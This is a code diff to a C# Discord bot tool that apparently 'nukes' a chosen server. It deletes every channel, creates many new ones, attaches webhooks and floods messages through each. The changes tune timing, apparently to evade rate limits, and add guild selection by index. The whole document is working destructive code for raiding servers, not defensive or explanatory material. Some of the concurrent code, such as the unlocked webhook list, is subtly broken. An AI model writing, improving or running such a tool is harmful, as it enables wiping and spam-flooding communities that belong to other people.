@@ -55,17 +55,53 @@ class Program
       return;
     }
     Console.WriteLine("[!] The bot is a member of the following guilds:");
-    foreach (var (guild, index) in guilds.Select((guild, index) => (guild, index)))
+    for (int i = 0; i < guilds.Count; i++)
     {
-      Console.WriteLine($"[{index}] >> {guild.name} - {guild.id} - Admin: {Util.BotIsAdmin(guild.permissions)}");
+      var guild = guilds[i];
+      Console.WriteLine($"[{i}] >> {guild.name} - {guild.id} - Admin: {Util.BotIsAdmin(guild.permissions)}");
     }
 
-    Console.Write("[?] Please enter the Guild ID from the list above: ");
+    Console.Write("[?] Select a guild by number or enter its Guild ID from the list above: ");
     string? guildId = Console.ReadLine();
 
-    if (guildId == null || guilds.Find(x => x.id == guildId) == null)
+    if (string.IsNullOrWhiteSpace(guildId))
     {
       Console.WriteLine("[!] Invalid Guild ID entered or the bot is not a member of the specified guild.");
+      Exit();
+      return;
+    }
+
+    DiscordGuild? selectedGuild = null;
+
+    if (int.TryParse(guildId, out int index))
+    {
+      if (index >= 0 && index < guilds.Count)
+      {
+        selectedGuild = guilds[index];
+      }
+      else
+      {
+        Console.WriteLine("[!] The selected index is out of range, Guild not found.");
+        Exit();
+        return;
+      }
+    }
+    else
+    {
+      selectedGuild = guilds.Find(g => g.id == guildId);
+      if (selectedGuild == null)
+      {
+        Console.WriteLine("[!] Guild ID not found in the list.");
+        Exit();
+        return;
+      }
+    }
+
+    guildId = selectedGuild.id;
+
+    if (string.IsNullOrWhiteSpace(guildId))
+    {
+      Console.WriteLine("[!] Guild ID null");
       Exit();
       return;
     }
@@ -86,10 +122,11 @@ class Program
     {
       foreach (DiscordChannel channelToDelete in channels)
       {
-        await Task.Run(async delegate
+        _ = Task.Run(async () =>
        {
          if (channelToDelete.id != null)
          {
+           await Task.Delay(300);
            await Discord.DeleteChannel(token, channelToDelete.id);
          }
        });
@@ -100,30 +137,56 @@ class Program
       Console.WriteLine("[!] No available channels were found in the selected guild to delete (Skipping)");
     }
 
-    List<DiscordWebhook> webhooks = [];
+    await Task.Delay(1500);
 
-    await Task.Delay(5000);
-
+    List<DiscordChannel> createdChannels = [];
+    List<Task> creationTasks = [];
 
     for (int i = 0; i < CHANNELS_TO_CREATE; i++)
     {
-      await Task.Run(async delegate
+      var task = Task.Run(async () =>
       {
+        await Task.Delay(300);
         DiscordChannel? new_channel = await Discord.CreateChannel(token, guildId);
         if (new_channel != null && new_channel.id != null)
         {
-          await Discord.CreateWebhookForChannel(token, new_channel.id, webhooks);
+          lock (createdChannels)
+          {
+            createdChannels.Add(new_channel);
+          }
+        }
+      });
+      creationTasks.Add(task);
+    }
+
+    await Task.WhenAll(creationTasks);
+
+    await Task.Delay(2000);
+
+    List<DiscordWebhook> webhooks = [];
+
+    foreach (DiscordChannel channel in createdChannels)
+    {
+      _ = Task.Run(async () =>
+      {
+        if (channel != null && !string.IsNullOrWhiteSpace(channel.id))
+        {
+          DiscordWebhook? webhook = await Discord.CreateWebhookForChannel(token, channel.id);
+          if (webhook != null && !string.IsNullOrWhiteSpace(webhook.url))
+          {
+            webhooks.Add(webhook);
+          }
         }
       });
     }
 
-    await Task.Delay(5000);
+    await Task.Delay(1500);
 
     foreach (DiscordWebhook webhook in webhooks)
     {
       if (webhook != null && webhook.url != null)
       {
-        _ = Task.Run(async delegate
+        _ = Task.Run(async () =>
       {
         for (int i = 0; i < MESSAGES_PER_WEBHOOK; i++)
         {
